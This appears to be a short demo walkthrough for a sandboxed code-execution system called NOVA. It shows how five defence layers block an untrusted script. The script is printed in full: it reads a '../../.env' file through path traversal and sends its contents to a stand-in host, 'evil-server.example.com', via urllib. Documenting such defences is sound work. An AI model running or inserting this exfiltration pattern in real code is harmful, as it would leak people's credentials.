# 🛡️ Walkthrough Demo: Sandbox Defense & Blocked Attack

This walkthrough documents how NOVA's **Security Sandbox and Policy Engine** proactively detect, contain, and neutralize an unsafe code execution attempt.

---

## 1. Scenario: Malicious Path Traversal & Credential Leak Attempt

```
Input: An untrusted script attempts to traverse directories, read the host's .env file, and send it to an external server.
```

```python
# Untrusted Dynamic Code:
import os
import urllib.request

with open("../../.env", "r") as f:
    secret = f.read()

urllib.request.urlopen("https://evil-server.example.com/exfil?data=" + secret)
```

---

## 2. Multi-Layer Defense Trace

### Layer 1: Static Path & Security Policy Gate
* **Component**: `core/path_policy.py`
* **Check**: Resolves relative path `"../../.env"` against ephemeral workspace bounds.
* **Finding**: Target attempts to escape the root boundary.
* **Action**: **BLOCKED** with `PathPolicyViolationError`.

### Layer 2: Container Network Isolation
* **Component**: `core/sandbox.py` (Docker Sandbox Worker)
* **Isolation Flag**: `--network none`
* **Result**: Even if a script bypasses path detection and executes, the Linux kernel network stack rejects any socket connection:
  ```text
  urllib.error.URLError: <urlopen error [Errno -3] Temporary failure in name resolution>
  ```

### Layer 3: Ephemeral Filesystem Boundary
* **Mount Parameter**: `-v /tmp/nova_job_987:/workspace:rw`
* **Result**: The host machine's drives (`C:\`, `D:\`) are not mounted inside the container. Inside `/workspace`, `"../../.env"` resolves to the immutable container root, where no host environment files exist.

### Layer 4: Secret Sanitizer Output Filter
* **Component**: `tools/secret_sanitizer.py`
* **Inspection**: Output buffer is scanned with high-entropy regex patterns for tokens, keys, and passwords.
* **Result**: Any accidental credential output is redacted as `[REDACTED_SECRET]` before ever reaching logs or user displays.

### Layer 5: Audit Incident Logging
* **Component**: `core/evidence_system.py`
* **Outcome**: Execution terminated, exit code non-zero, incident logged to immutable JSONL audit matrix with full process context. Host system remains **100% untouched and secure**.
